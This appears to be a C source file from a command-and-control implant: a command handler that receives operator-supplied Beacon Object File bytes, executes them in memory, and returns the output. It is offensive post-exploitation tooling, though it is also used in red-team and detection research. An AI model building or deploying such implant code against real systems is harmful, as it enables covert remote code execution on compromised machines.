#include "config.h"
#ifdef INCLUDE_CMD_INLINE_EXECUTE

#include "commands.h"
#include "coff.h"

VOID cmd_inline_execute(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD coff_len = 0;
    BYTE* coff_data = parser_bytes(args, &coff_len);

    if (!coff_data || coff_len == 0) {
        package_add_string(inst, response, XSTR("No BOF data provided"));
        response->is_error = TRUE;
        return;
    }

    DWORD arg_len = 0;
    BYTE* arg_data = parser_bytes(args, &arg_len);

    char*  output     = NULL;
    DWORD  output_len = 0;

    BOOL ok = bof_execute(inst, coff_data, coff_len,
                          arg_data, arg_len,
                          &output, &output_len);

    if (ok && output && output_len > 0) {
        package_add_bytes(inst, response, (BYTE*)output, output_len);
    } else if (!ok) {
        if (output && output_len > 0)
            package_add_bytes(inst, response, (BYTE*)output, output_len);
        else
            package_add_string(inst, response, XSTR("BOF execution failed"));
        response->is_error = TRUE;
    }

    if (output)
        es_free(inst, output);
}

#endif
